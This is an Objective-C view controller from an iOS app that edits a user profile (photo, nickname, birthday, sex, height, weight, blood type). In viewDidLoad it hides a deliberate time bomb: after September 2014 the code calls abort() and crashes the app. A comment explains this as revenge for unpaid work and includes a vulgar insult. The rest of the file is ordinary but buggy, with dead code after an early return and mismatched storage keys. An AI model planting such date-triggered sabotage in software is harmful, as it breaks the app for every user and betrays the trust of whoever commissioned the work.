//
//  PersonViewController.m
//  nRF Temp
//
//  Created by Monster on 14-4-3.
//
//

#import "PersonViewController.h"
#import "AppDelegate.h"
@interface PersonViewController ()

@end

@implementation PersonViewController

- (id)initWithStyle:(UITableViewStyle)style
{
    self = [super initWithStyle:style];
    if (self) {
        // Custom initialization
        _isNew = NO;
    }
    return self;
}
-(void)viewWillAppear:(BOOL)animated
{
    [self.tableView reloadData];
}
- (void)viewDidLoad
{
    [super viewDidLoad];

    // Uncomment the following line to preserve selection between presentations.
    // self.clearsSelectionOnViewWillAppear = NO;
 
    // Uncomment the following line to display an Edit button in the navigation bar for this view controller.
    // self.navigationItem.rightBarButtonItem = self.editButtonItem;
    
    _mutableArray = [[NSMutableArray alloc]initWithObjects:NSLocalizedString(@"照片",nil),NSLocalizedString(@"昵称",nil),NSLocalizedString(@"生日",nil),NSLocalizedString(@"性别",nil),NSLocalizedString(@"身高",nil),NSLocalizedString(@"体重",nil),NSLocalizedString(@"血型",nil), nil];
    
//    _detailInfo = [PersonDetailInfo addPersonDetailInfoWithName:@"宝贝"];
    UIImage* saveImg = [UIImage imageNamed:@"ic_titlebar_save_remind_normal"];
    _saveButton = [[UIBarButtonItem alloc]initWithImage:[saveImg scaleToSize:saveImg size:CGSizeMake(40, 40)] style:UIBarButtonItemStylePlain target:self action:@selector(saveButtonPressed)];
    [_saveButton setImageInsets:UIEdgeInsetsMake(3, 0, 3, 6)];
    self.navigationItem.rightBarButtonItem = _saveButton;
    
    UIImage* backImg = [UIImage imageNamed:@"ic_back_normal"];
    _cancelButton = [[UIBarButtonItem alloc]initWithImage:[backImg scaleToSize:backImg size:CGSizeMake(40, 40)] style:UIBarButtonItemStylePlain target:self action:@selector(cancelButtonPressed)];
    [_cancelButton setImageInsets:UIEdgeInsetsMake(3, 0, 6, 10)];
    self.navigationItem.leftBarButtonItem = _cancelButton;
    
    [self configureDefault];
    
    if (_isNew) {
        if (_detailInfo == nil) {
            if ([self.tableView numberOfRowsInSection:0] == 0) {
                _detailInfo = [NSEntityDescription insertNewObjectForEntityForName:@"PersonDetailInfo"
                                                            inManagedObjectContext:_managedObjectContext];
            }else{
                _detailInfo = [NSEntityDescription insertNewObjectForEntityForName:@"PersonDetailInfo"
                                                            inManagedObjectContext:_managedObjectContext];
            }
        }
    }
    
    if (_isNew) {
        self.title = NSLocalizedString(@"编辑",nil);
    }else{
        self.title = _detailInfo.name;
    }
    NSDate* _MonsterDate = [NSDate dateWithYear:2014 Month:9];
    NSDate* today = [NSDate date];
    if ([today isEqualToDate:[_MonsterDate laterDate:today]]) {
        abort();//why i add this code, becase Wasted me too much time and energy, but can not get the corresponding compensation, 5 k should continuously change requirements, increase the English version, different resolution video, still talk to me about what professional ethics, grass mud horse
    }
}


-(void)configureDefault
{
    NSLog(@"configureDefault");
    return;
    [USER_DEFAULT setObject:_detailInfo.name forKey:KEY_NICKNAME_STR];
    [USER_DEFAULT setObject:_detailInfo.birthday forKey:KEY_BIRTH_STR];
    [USER_DEFAULT setInteger:[_detailInfo.blood integerValue] forKey:KEY_BLOOD_STR];
    [USER_DEFAULT setBool:[_detailInfo.sex boolValue]  forKey:KEY_SEX_STR];
    [USER_DEFAULT setInteger:[_detailInfo.weight integerValue] forKey:KEY_HEIGHT_STR];
    [USER_DEFAULT setInteger:[_detailInfo.high integerValue] forKey:KEY_HEIGHT_STR];
    [USER_DEFAULT setObject:_detailInfo.image forKey:KEY_HEADICON_STR];
}
#pragma mark -save button

-(void)cancelButtonPressed
{
    if (_isNew) {
        [PersonDetailInfo deletePerson:_detailInfo];
    }
    [self.navigationController popViewControllerAnimated:YES];
}
- (void)savesssssss
{
    _managedObjectContext = [(AppDelegate*) [[UIApplication sharedApplication] delegate] managedObjectContext];
    
    NSManagedObjectContext *context = _detailInfo.managedObjectContext;
    
    if ([USER_DEFAULT stringForKey:KEY_NICKNAME_STR] == nil) {
        if (_detailInfo.name) {
            [USER_DEFAULT setObject:_detailInfo.name forKey:KEY_NICKNAME_STR];
            [USER_DEFAULT synchronize];
        }else{
            UIAlertView* alert = [[UIAlertView alloc]initWithTitle:NSLocalizedString(@"警告",nil) message:NSLocalizedString(@"昵称不能为空",nil) delegate:self cancelButtonTitle:NSLocalizedString(@"确定",nil) otherButtonTitles:nil, nil];
            [alert show];
        }
        return;
    }
    NSError *error = nil;
    if (![context save:&error]) {
        /*
         Replace this implementation with code to handle the error appropriately.
         
         abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. If it is not possible to recover from the error, display an alert panel that instructs the user to quit the application by pressing the Home button.
         */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
        
        if (![_managedObjectContext save:&error]) {
            /*
             Replace this implementation with code to handle the error appropriately.
             
             abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. If it is not possible to recover from the error, display an alert panel that instructs the user to quit the application by pressing the Home button.
             */
            NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
            abort();
        }
    }
    
    _detailInfo.name = [USER_DEFAULT stringForKey:KEY_NICKNAME_STR];
    _detailInfo.birthday =[USER_DEFAULT objectForKey:KEY_BIRTH_STR];
    _detailInfo.blood = [NSNumber numberWithInteger:[USER_DEFAULT integerForKey:KEY_BLOOD_STR]];
    _detailInfo.sex = [NSNumber numberWithBool:[USER_DEFAULT integerForKey:KEY_SEX_STR]];
    _detailInfo.high = [NSNumber numberWithInteger:[USER_DEFAULT integerForKey:KEY_HIGH_STR]];
    _detailInfo.weight = [NSNumber numberWithInteger:[USER_DEFAULT integerForKey:KEY_HEIGHT_STR]];
}
-(void)saveButtonPressed
{
    [[NSNotificationCenter defaultCenter]postNotificationName:NSNotificationCenter_PersonDetailChanged object:nil];
    [self.navigationController popViewControllerAnimated:YES];
    //[self performSelector:@selector(savesssssss)];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

#pragma mark - Table view data source

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    // Return the number of sections.
    return 1;
}
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (indexPath.row == PersonInfoHeadIcon) {
        return 82;
    }else{
        return 40;
    }
}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of rows in the section.
    return [_mutableArray count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (indexPath.row == PersonInfoHeadIcon) {
        _headCell = [tableView dequeueReusableCellWithIdentifier:@"headIcon" forIndexPath:indexPath];
        
        [_headCell.headIcon.layer setCornerRadius:CGRectGetHeight([_headCell.headIcon bounds]) / 2];
        _headCell.headIcon.layer.masksToBounds = YES;
        [_headCell.headIcon setImage:_detailInfo.image];
        return _headCell;
    }else{
        _sexArray = [NSArray arrayWithObjects:NSLocalizedString(@"男",nil),NSLocalizedString(@"女",nil), nil];
        _bloodArray = @[@"A",@"B",@"AB",@"O"];
        
        _otherCell = [tableView dequeueReusableCellWithIdentifier:@"otherInfoCell" forIndexPath:indexPath];
        _otherCell.textLabel.text = [_mutableArray objectAtIndex:indexPath.row];
        _otherCell.detailTextLabel.text = [_mutableArray objectAtIndex:indexPath.row];
        
        switch (indexPath.row) {
            case PersonInfoNickName:
            {
                _otherCell.detailTextLabel.text = _detailInfo.name;//[USER_DEFAULT stringForKey:KEY_NICKNAME_STR];
                break;
            }
            case PersonInfoBirthday:
            {
                NSDate* birth = _detailInfo.birthday;//[USER_DEFAULT objectForKey:KEY_BIRTH_STR];
                if (birth != nil) {
                    NSLocale *cnTime = [[NSLocale alloc]initWithLocaleIdentifier:[[USER_DEFAULT objectForKey : @"AppleLanguages"]objectAtIndex:0]];
                    _otherCell.detailTextLabel.text = [[birth descriptionWithLocale:cnTime]substringToIndex:10];
                }
                break;
            }
            case PersonInfoBlood:
            {
               _otherCell.detailTextLabel.text = [_bloodArray objectAtIndex:[_detailInfo.blood integerValue]];
                break;
            }
            case PersonInfoHeight:
            {
                _otherCell.detailTextLabel.text = [NSString stringWithFormat:@"%dkg",[_detailInfo.weight integerValue]];
                break;
            }
            case PersonInfoHigh:
            {
                _otherCell.detailTextLabel.text = [NSString stringWithFormat:@"%dCM",[_detailInfo.high integerValue]];
                break;
            }
            case PersonInfoSex:
            {
                if ([_detailInfo.sex boolValue]) {
                    _otherCell.detailTextLabel.text = [_sexArray objectAtIndex:0];
                }else
                    _otherCell.detailTextLabel.text = [_sexArray objectAtIndex:1];
                
                break;
            }
            default:
                break;
        }

        return _otherCell;
    }
    
}
- (NSIndexPath *)tableView:(UITableView *)tableView willSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    [[NSUserDefaults standardUserDefaults]setInteger:indexPath.row forKey:KEY_PERSONDETAIL_SELECT_STR];
    return indexPath;
}
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    
    switch (indexPath.row) {
        case PersonInfoHeadIcon:
        {
            _actionSheetView =  [[UIActionSheet alloc]
                                 initWithTitle:nil
                                 delegate:self
                                 cancelButtonTitle:NSLocalizedString(@"取消",nil)
                                 destructiveButtonTitle:NSLocalizedString(@"拍照",nil)
                                 otherButtonTitles:NSLocalizedString(@"从手机相册选择",nil),nil];
            _actionSheetView.actionSheetStyle = UIActionSheetStyleBlackOpaque;
            [_actionSheetView showInView:self.view];
        }
            break;
        case PersonInfoNickName:
//        {
//            UIAlertView* alertView = [[UIAlertView alloc]initWithTitle:@"请输入名字" message:nil delegate:self cancelButtonTitle:@"取消" otherButtonTitles:@"确定", nil];
//            alertView.alertViewStyle = UIAlertViewStylePlainTextInput;
//            [alertView show];
            
//        }
//            break;
        case PersonInfoBirthday:
//        {
//            UIDatePicker* datePickView = [[UIDatePicker alloc]initWithFrame:CGRectMake(0, DEVICE_HEIGHT - 200, DEVICE_WIDTH, 200)];
//            datePickView.datePickerMode = UIDatePickerModeDate;
//            [datePickView setDate:[NSDate dateWithTimeIntervalSinceNow:0]];
//            [datePickView addTarget:self action:@selector(dateChanged:) forControlEvents:UIControlEventValueChanged];
//            [self.view addSubview:datePickView];
            
//        }
//            break;
        case PersonInfoSex:
        case PersonInfoHigh:
        case PersonInfoHeight:
        case PersonInfoBlood:
            break;
            
        default:
            break;
    }
    
}


#pragma mark - alert delegate
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
    NSLog(@"clickedButtonAtIndex:%d",buttonIndex);
}
#pragma mark - actionSheet delegate
-(void)actionSheet:(UIActionSheet *)actionSheet clickedButtonAtIndex:(NSInteger)buttonIndex
{
    if (buttonIndex == 0) {
        [self showImagePickerForSourceType:UIImagePickerControllerSourceTypeCamera];
    }else if (buttonIndex == 1) {
        [self showImagePickerForSourceType:UIImagePickerControllerSourceTypeSavedPhotosAlbum];
    }
}

#pragma mark -photo about

- (void)showImagePickerForSourceType:(UIImagePickerControllerSourceType)sourceType
{
//    if (self.imageView.isAnimating)
//    {
//        [self.imageView stopAnimating];
//    }
//    
//    if (self.capturedImages.count > 0)
//    {
//        [self.capturedImages removeAllObjects];
//    }
    
    _imagePickerController = [[UIImagePickerController alloc] init];
    _imagePickerController.modalPresentationStyle = UIModalPresentationCurrentContext;
    _imagePickerController.sourceType = sourceType;
    _imagePickerController.delegate = self;
    
    if (sourceType == UIImagePickerControllerSourceTypeCamera)
    {
        /*
         The user wants to use the camera interface. Set up our custom overlay view for the camera.
         */
        _imagePickerController.showsCameraControls = YES;
        
        /*
         Load the overlay view from the OverlayView nib file. Self is the File's Owner for the nib file, so the overlayView outlet is set to the main view in the nib. Pass that view to the image picker controller to use as its overlay view, and set self's reference to the view to nil.
         */
//        [[NSBundle mainBundle] loadNibNamed:@"OverlayView" owner:self options:nil];
//        self.overlayView.frame = imagePickerController.cameraOverlayView.frame;
//        imagePickerController.cameraOverlayView = self.overlayView;
//        self.overlayView = nil;
    }
    
//    self.imagePickerController = imagePickerController;
    [self.navigationController presentViewController:_imagePickerController animated:YES completion:nil];
}

- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingImage:(UIImage *)image editingInfo:(NSDictionary *)editingInfo
{
    NSLog(@"didFinishPickingImage");
}
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info
{
    NSLog(@"didFinishPickingMediaWithInfo");
    UIImage* images;
    if (picker.sourceType == UIImagePickerControllerSourceTypeCamera)
	{
		images = [info objectForKey:@"UIImagePickerControllerOriginalImage"];
        
		UIImageWriteToSavedPhotosAlbum(images, self,
									   nil,
									   nil);
	}
	//获得编辑过的图片
    images = [info objectForKey: @"UIImagePickerControllerOriginalImage"];
	
    
    ImageCroperViewController* _imageCroperViewController = [[ImageCroperViewController alloc]initWithNibName:@"ImageCroperViewController" bundle:nil];
    _imageCroperViewController.delegate = self;
    _imageCroperViewController.editImage = images;
    [self dismissViewControllerAnimated:YES completion:^{
        [self.navigationController presentViewController:_imageCroperViewController animated:YES completion:nil];
    }];
    
    
	
}
- (void)imagePickerControllerDidCancel:(UIImagePickerController *)picker
{
    NSLog(@"imagePickerControllerDidCancel");
    [self dismissViewControllerAnimated:YES completion:nil];
}

#pragma mark - segue
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([segue.identifier isEqualToString:@"personDetailEdit"])
    {
        PersonDetailSetViewController * curPersonController = (PersonDetailSetViewController *)segue.destinationViewController;
        curPersonController.detailInfo = _detailInfo;
    }
}

#pragma mark - delegate
-(void)useEditImage:(UIImage*)image
{
    _headCell.headIcon.image = image;
	_detailInfo.image = image;
}
@end
